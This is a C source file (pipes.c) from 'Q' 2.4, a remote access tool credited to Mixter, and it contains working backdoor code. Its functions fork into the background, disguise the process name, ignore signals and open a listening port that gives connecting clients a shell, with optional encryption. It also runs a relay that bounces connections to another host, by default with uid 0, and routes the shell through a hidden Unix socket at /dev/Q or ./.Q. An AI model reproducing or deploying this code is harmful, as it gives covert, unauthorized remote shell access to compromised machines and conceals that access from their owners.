/*   ___
   '/ _ \        Version 2.4 - Remote access and
   | | | |  redirection services with strong encryption.
   | |_| |           (c) 1999-2001 by Mixter
   '\__\_\   pipes.c - encryption tunneling via sockets
 */

#include "q.h"

char *q_shell = Q_SHELL;
#ifdef Q_UID
int q_uid = Q_UID;
#else
int q_uid = 0;
#endif

void
ssh (int port, int crypt, int acp, char **avp)
{
  int c, d, e = sizeof (struct sa);
  issl_t qrdesc;
  struct sa l, r;
  if (fork ())
    return;
  disguise (HARMLESS1, acp, avp);
  sighandler (SIG_IGN);
#ifdef WANT_LOGGING
  slog ("running shell on port %d, encryption: %s", port, crypt ? "enabled" : "disabled");
#endif
  l.fam = PF_INET;
  l.dp = htons (port);
  l.add = INADDR_ANY;
  bzero (&(l.zero), 8);
  c = socket (PF_INET, SOCK_STREAM, 0);
  if (bind (c, (struct sockaddr *) &l, sizeof (struct sockaddr)) < 0)
      exit (0);
  listen (c, 1);
  if ((d = accept (c, (struct sockaddr *) &r, (unsigned int *) &e)))
    {
      qrdesc.fd = d;
      if (crypt)
       {
	if (issl_accept(&qrdesc)<0)
	  exit (0);
       }
      dup2 (d, 0);
      dup2 (d, 1);
      dup2 (d, 2);
      cryptopipe (qrdesc, q_shell, crypt);
      close (d);
    }
  close (c);
  raise (9);
  exit (0);
}

void
red (int dport, int sport, int crypt, int acp, char **avp, u32 sv)
{
  int c, d, e = sizeof (struct sa);
  struct sa l, r;
  issl_t qrdesc;

  if (fork ())
    return;
  disguise (HARMLESS2, acp, avp);
  sighandler (SIG_IGN);
#ifdef WANT_LOGGING
  slog ("running bouncer on port %d, destination: %s:%d, encryption: %s", sport, ntoa (sv), dport, crypt ? "enabled" : "disabled");
#endif
  l.fam = PF_INET;
  l.dp = htons (sport);
  l.add = INADDR_ANY;

  bzero (&(l.zero), 8);
  c = socket (PF_INET, SOCK_STREAM, 0);
  if (bind (c, (struct sockaddr *) &l, sizeof (struct sockaddr)) < 0)
      exit (0);
  listen (c, 1);

  while ((d = accept (c, (struct sockaddr *) &r, (unsigned int *) &e)))
    {
     qrdesc.fd = d;
      if (!fork ())
	{
	  if (crypt)
            if (issl_accept(&qrdesc)<0)
	      exit (0);
	  setuid (q_uid);
	  dup2 (d, 0);
	  dup2 (d, 1);
	  dup2 (d, 2);
	  bnc (dport, qrdesc, crypt, sv);
	  close (d);
	  exit (0);
	}
    }
  close (c);
  exit (0);
}

void
cryptopipe (issl_t fd, char *prog, int crypt)
{
  int sock;
  struct su sau;
  sau.fam = PF_UNIX;
  if (!getuid ())
    {
      memset (sau.path, 0, 100);
      sau.path[0] = '/';
      sau.path[1] = 'd';
      sau.path[2] = 'e';
      sau.path[3] = 'v';
      sau.path[4] = '/';
      sau.path[5] = 'Q';
    }
  else
    {
      memset (sau.path, 0, 100);
      sau.path[0] = '.';
      sau.path[1] = '/';
      sau.path[2] = '.';
      sau.path[3] = 'Q';
    }
  unlink (sau.path);
  if (fork () == 0)
    {
      int el8;
      sighandler (SIG_IGN);	/* unix socket, cute isnt it?! */
      sock = socket (PF_UNIX, 1, 0);
      bind (sock, (struct sockaddr *) &sau, sizeof (struct sockaddr));
      listen (sock, 1);
      if ((el8 = accept (sock, 0, 0)))
	{
	  dup2 (el8, 0);
	  dup2 (el8, 1);
	  dup2 (el8, 2);
	  execlp (prog, prog, NULL);
	}
      raise (9);
      exit (0);
    }
  else
    {
      sleep (5);
      sock = socket (PF_UNIX, 1, 0);
      connect (sock, (struct sockaddr *) &sau, sizeof (struct sockaddr));
      if (crypt)
       isslterm (sock, fd);
      else
       ioterm (sock, fd.fd, crypt);
      close (sock);
    }
  unlink (sau.path);
  return;
}

void
bnc (int port, issl_t infd, int crypt, u32 sv)
{
  int probe, tsock;
  struct sa target;
  tsock = socket (PF_INET, SOCK_STREAM, 0);
  target.fam = PF_INET;
  target.dp = htons (port);
  target.add = sv;
  bzero (&target.zero, 8);
  probe = connect (tsock, (struct sockaddr *) &target, sizeof (struct sockaddr));
  if (probe >= 0)
   {
    if (crypt)
     isslterm (tsock, infd);
      else
     ioterm (tsock, infd.fd, crypt);
   }
  close (tsock);
  return;
}
